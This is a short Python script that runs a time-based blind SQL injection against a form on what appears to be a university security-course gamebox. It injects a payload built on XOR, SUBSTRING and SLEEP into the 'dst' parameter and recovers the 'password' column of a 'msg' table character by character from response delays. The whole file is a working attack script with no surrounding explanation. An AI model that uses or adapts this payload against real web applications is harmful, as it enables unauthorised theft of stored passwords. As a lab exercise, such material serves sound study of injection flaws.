#!/usr/bin/env python
import httplib, urllib
from time import time

sleepTime = 5
waitTime = 2

def blindInjection():

	for i in range(1, 5):
		for j in range(ord('a'), ord('z') + 1):
			char = chr(j)
			query = '''\' XOR(SELECT IF(SUBSTRING(password,''' + str(i) + ''', 1)="''' + char + '''", SLEEP(''' + str(sleepTime) + '''), 0) FROM msg) OR \''''
			params = urllib.urlencode( {'Invia':'Submit+Query','src':'a','txt':'b','dst':query} )
			
			conn = httplib.HTTPConnection("gamebox.laser.dico.unimi.it")
			conn.request("POST", "/aa1314_sec2_web0x32/msg/send.py", params)
			
			start = time()
			risp = conn.getresponse()
			data = risp.read()
			end = time()

			if( end - start ) > waitTime:
				print char,
			
			conn.close()

if __name__ == '__main__':

	blindInjection()
